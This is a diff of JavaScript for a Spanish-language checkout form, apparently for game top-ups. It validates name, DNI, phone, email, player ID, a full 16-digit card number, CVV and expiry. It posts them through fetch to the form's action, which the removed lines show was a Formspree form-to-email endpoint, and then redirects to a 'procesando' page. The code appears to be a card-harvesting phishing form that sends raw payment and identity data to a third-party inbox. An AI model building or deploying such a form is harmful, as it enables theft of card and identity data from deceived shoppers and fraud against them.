@@ -1,68 +1,67 @@
 ﻿document.addEventListener("DOMContentLoaded", () => {
-  const form = document.getElementById("formulario-compra");
+  const params = new URLSearchParams(window.location.search);
+  const producto = params.get("producto") || "Producto no especificado";
+  const precio = params.get("precio") || "0";
 
-  form.addEventListener("submit", async (e) => {
+  // Mostrar producto y precio en el formulario
+  const productoInput = document.getElementById("producto");
+  const precioInput = document.getElementById("precio");
+  if (productoInput) productoInput.value = producto;
+  if (precioInput) precioInput.value = "S/ " + precio;
+
+  const form = document.getElementById("compraForm");
+
+  form.addEventListener("submit", function (e) {
     e.preventDefault();
+
+    // Validaciones
+    const nombre = form.querySelector("input[name='nombre']");
+    const dni = form.querySelector("input[name='dni']");
+    const celular = form.querySelector("input[name='celular']");
+    const email = form.querySelector("input[name='email']");
+    const idJugador = form.querySelector("input[name='id_jugador']");
+    const tarjeta = form.querySelector("#tarjeta");
+    const cvv = form.querySelector("#cvv");
+    const expiracion = form.querySelector("#expiracion");
 
     let valido = true;
 
-    // Validación general de campos requeridos
-    form.querySelectorAll("input[required]").forEach(input => {
-      if (!input.value.trim()) {
-        input.classList.add("error");
+    function marcarError(campo, condicion) {
+      if (condicion) {
+        campo.classList.add("error");
         valido = false;
       } else {
-        input.classList.remove("error");
+        campo.classList.remove("error");
       }
-    });
-
-    // Validación específica de DNI
-    const dni = document.getElementById("dni").value.trim();
-    if (dni.length !== 8) {
-      alert("El DNI debe tener exactamente 8 dígitos.");
-      valido = false;
     }
 
-    // Validación específica de celular
-    const telefono = document.getElementById("telefono").value.trim();
-    if (telefono.length < 9) {
-      alert("El número de celular debe tener al menos 9 dígitos.");
-      valido = false;
+    marcarError(nombre, nombre.value.trim() === "");
+    marcarError(dni, dni.value.length !== 8 || !/^\d{8}$/.test(dni.value));
+    marcarError(celular, celular.value.length !== 9 || !/^\d{9}$/.test(celular.value));
+    marcarError(email, email.value.trim() === "");
+    marcarError(idJugador, idJugador.value.trim() === "");
+    marcarError(tarjeta, tarjeta.value.length !== 16 || !/^\d{16}$/.test(tarjeta.value));
+    marcarError(cvv, cvv.value.length !== 3 || !/^\d{3}$/.test(cvv.value));
+    marcarError(expiracion, expiracion.value.trim() === "");
+
+    if (!valido) {
+      alert("Por favor completa correctamente todos los campos.");
+      return;
     }
 
-    // Validación de tarjeta
-    const tarjeta = document.getElementById("tarjeta").value.trim();
-    if (tarjeta.length < 13 || tarjeta.length > 19) {
-      alert("El número de tarjeta debe tener entre 13 y 19 dígitos.");
-      valido = false;
-    }
-
-    // Validación de CVV
-    const cvv = document.getElementById("cvv").value.trim();
-    if (cvv.length < 3 || cvv.length > 4) {
-      alert("El CVV debe tener 3 o 4 dígitos.");
-      valido = false;
-    }
-
-    if (!valido) return;
-
-    try {
-      const formData = new FormData(form);
-
-      // Enviar a Formspree
-      const response = await fetch("https://formspree.io/f/mnnbkeaj", {
-        method: "POST",
-        body: formData,
-        headers: { "Accept": "application/json" }
-      });
-
-      if (response.ok) {
-        window.location.href = "procesando.html";
-      } else {
-        alert("Error al enviar el formulario. Intenta nuevamente.");
-      }
-    } catch (err) {
-      alert("Ocurrió un error al conectar con el servidor.");
-    }
+    // Enviar a Formspree
+    fetch(form.action, {
+      method: "POST",
+      body: new FormData(form),
+      headers: { Accept: "application/json" }
+    })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "procesando.html";
+        } else {
+          alert("Error al enviar el formulario.");
+        }
+      })
+      .catch(() => alert("Error de conexión, intenta nuevamente."));
   });
 });
